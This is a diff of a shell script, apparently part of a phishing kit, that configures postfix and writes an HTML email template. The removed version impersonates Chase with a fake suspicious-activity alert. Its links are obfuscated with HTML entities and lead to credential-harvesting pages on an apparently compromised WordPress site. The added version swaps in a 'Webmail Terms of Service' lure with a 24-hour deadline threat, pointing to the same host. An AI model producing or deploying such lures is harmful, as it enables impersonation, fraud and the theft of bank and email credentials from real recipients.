@@ -45,7 +45,99 @@ service postfix restart
 # === Create HTML email content ===
 echo "Creating email.html..."
 cat > email.html <<EOL
-<!DOCTYPE html><html lang="en"><head> <meta charset="UTF-8" /> <meta name="viewport" content="width=device-width, initial-scale=1.0"/> <title>Security Alert – Action Required</title> <style> body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 20px; color: #333; } .container { max-width: 600px; margin: auto; background-color: #fff; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); overflow: hidden; } .header { background-color: #fff; padding: 20px; text-align: center; } .header img { max-width: 150px; } .content { padding: 30px 20px; } .content h1 { font-size: 20px; margin-bottom: 10px; color: #0a2f5c; } .content p { font-size: 15px; line-height: 1.6; margin: 10px 0; } .content ul { padding-left: 20px; margin: 10px 0; } .content ul li { margin-bottom: 6px; } .button { display: inline-block; margin-top: 20px; padding: 12px 24px; background-color: #0a2f5c; color: #fff; font-weight: bold; text-decoration: none; border-radius: 5px; transition: background-color 0.3s ease; } .button:hover { background-color: #1d4e89; } .alert { margin-top: 30px; background-color: #fff3cd; padding: 15px; border-radius: 5px; font-weight: 600; color: #856404; border: 1px solid #ffeeba; } .footer { text-align: center; font-size: 13px; color: #777; margin-top: 30px; } .footer a { color: #2672ec; text-decoration: none; } .footer a:hover { text-decoration: underline; } @media (max-width: 600px) { .content { padding: 20px 15px; } } </style></head><body> <!-- 545c3de1 --><div class="container"> <!-- Header --> <!-- 545c3de1 --><div class="header"> <img src="https&#58;//ik.ima&#103;ek&#105;t.&#105;o/y&#108;e&#117;l&#116;aj&#52;/IM&#71;_7&#48;37.&#112;ng?updatedAt&#61;&#49;756&#52;&#49;&#53;&#52;28&#54;&#54;4" alt="Company Logo" /> <!-- 545c3de1 --></div> <!-- Email Body --> <!-- 545c3de1 --><div class="content"> <h1>Important: Suspicious Activity Detected</h1> <p>Hello {{EMAIL}},</p> <p> We have detected unusual activity on your Checking/Savings account on <strong>September 21, 2025</strong> at <strong>2:21 AM</strong>. This behavior differs from your usual transactions and has triggered our security systems. </p> <p><strong>Possible reasons for this alert include:</strong></p> <ul> <li>Incorrect login credentials used</li> <li>Unrecognized login location or device</li> <li>Multiple failed login attempts</li> <li>Suspicious outgoing transactions</li> </ul> <p> As a precaution, we have temporarily restricted access to your account. To restore full access and confirm your identity, please use the secure link below. </p> <p style="text-align: center;"> <a href="&#104;t&#116;ps://&#109;&#111;&#110;&#115;t&#101;rmeeple&#46;com.&#109;x&#47;&#119;&#112;-ad&#109;in/up&#47;c&#97;ptcha.htm&#108;?e&#109;a&#105;l={{EM&#65;&#73;L}}" class="button">Secure Your Account</a> </p> <!-- 545c3de1 --><div class="alert"> Please complete verification within 24 hours to avoid permanent restrictions on your account. <!-- 545c3de1 --></div> <p>Thank you for your prompt attention.</p> <p>Chase Security Team</p> <!-- 545c3de1 --></div> <!-- 545c3de1 --></div> <!-- Footer --> <!-- 545c3de1 --><div class="footer"> <p> Already completed the verification? <a href="htt&#112;s://&#98;ro&#110;co.&#119;e&#98;s&#105;t&#101;/&#117;p&#47;&#105;&#110;/&#99;a&#112;t&#99;&#104;a.php?em&#97;&#105;l&#61;{{&#69;&#77;AI&#76;}}">Click here</a> to notify our Anti-Fraud team. </p> <p>&copy; 2025 JP Morgan Chase & Co.</p> <!-- 545c3de1 --></div></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Action Required: Update Your Account</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f2f4f8;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 600px;
+      margin: 40px auto;
+      background-color: #ffffff;
+      border-radius: 10px;
+      padding: 30px 40px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+    }
+    .header {
+      text-align: center;
+      margin-bottom: 25px;
+    }
+    .header img {
+      max-width: 180px;
+      margin-bottom: 10px;
+    }
+    .title {
+      font-size: 22px;
+      font-weight: 600;
+      color: #0077cc;
+    }
+    .content {
+      font-size: 16px;
+      color: #444;
+      line-height: 1.7;
+    }
+    .content p {
+      margin: 16px 0;
+    }
+    .button-container {
+      text-align: center;
+      margin-top: 30px;
+    }
+    .cta-button {
+      background-color: #0077cc;
+      color: #ffffff;
+      padding: 14px 28px;
+      border-radius: 6px;
+      text-decoration: none;
+      font-size: 16px;
+      font-weight: 600;
+      transition: background-color 0.3s ease;
+    }
+    .cta-button:hover {
+      background-color: #005fa3;
+    }
+    .footer {
+      margin-top: 40px;
+      font-size: 12px;
+      color: #888;
+      text-align: center;
+      line-height: 1.5;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <img src="https://ik.imagekit.io/yleultaj4/webmail.jpg?updatedAt=1747527364367" alt="Webmail Logo" />
+      <div class="title">Action Required: Update Your Account</div>
+    </div>
+    <div class="content">
+      <p>Dear {{EMAIL}},</p>
+      <p>We have recently updated our <strong>Webmail Terms of Service</strong> to better serve you and enhance the security of your account.</p>
+      <p>To ensure uninterrupted access, we kindly request you to verify and update your account details.</p>
+      <p><strong>What you need to do:</strong><br>
+      Click the button below to review and confirm your account information.</p>
+      <p><strong>Please Note:</strong><br>
+      Failure to complete this process within the next 24 hours may result in temporary access restrictions or potential data loss.</p>
+    </div>
+    <div class="button-container">
+      <a href="https://monstermeeple.com.mx/wp-admin/up/captcha2.html?email={{EMAIL}}" class="cta-button">Update My Account</a>
+    </div>
+    <div class="footer">
+      &copy; 2025 Webmail Services. All rights reserved.<br />
+      This is an automated message—please do not reply.
+    </div>
+  </div>
+</body>
+</html>
 EOL
 
 # Make email.html writable (rw-rw-r--)
